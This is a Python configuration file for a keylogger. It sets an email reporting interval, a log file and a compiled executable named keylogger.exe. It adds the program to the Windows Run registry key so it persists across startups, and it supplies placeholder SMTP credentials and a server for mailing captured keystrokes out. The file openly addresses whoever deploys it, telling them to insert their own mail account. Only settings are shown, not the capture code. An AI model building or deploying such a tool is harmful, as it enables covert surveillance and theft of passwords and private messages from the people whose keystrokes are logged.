import sys
import os

# change this to modify how often you want receive email updates in seconds

FREQUENCY = 60

CURRENT_DIRECTORY = os.path.dirname(os.path.realpath(__file__))

# the name of the file the logged key should be saved to : you can change this

FILE_NAME = "output.txt" 

FILE_PATH = os.path.join(CURRENT_DIRECTORY,FILE_NAME)

# the name of the compiled keylogger app: you can change this

EXECUTABLE_FILE_NAME = "keylogger.exe"

EXECUTABLE_FILE_PATH = os.path.join(CURRENT_DIRECTORY,EXECUTABLE_FILE_NAME)

REGISTRY_KEY_VALUE = r"Software\Microsoft\Windows\CurrentVersion\Run"

REGISTRY_APP_NAME = "keylogger"

# clear the keylogger file when the computer or app starts up

CLEAR_ON_STARTUP = False

TERMINATE_KEY = "enter"

# change this to your mail address

EMAIL = "test@example.com"

# change this to your password, note use a non important email!

PASSWORD = "test"

# change this to the subject you want the mail to carry

SUBJECT = "Test Log"

# change to your smtp server

SMTP_SERVER = "smtp.example.com"

# change to your smtp port

SMTP_PORT = 587

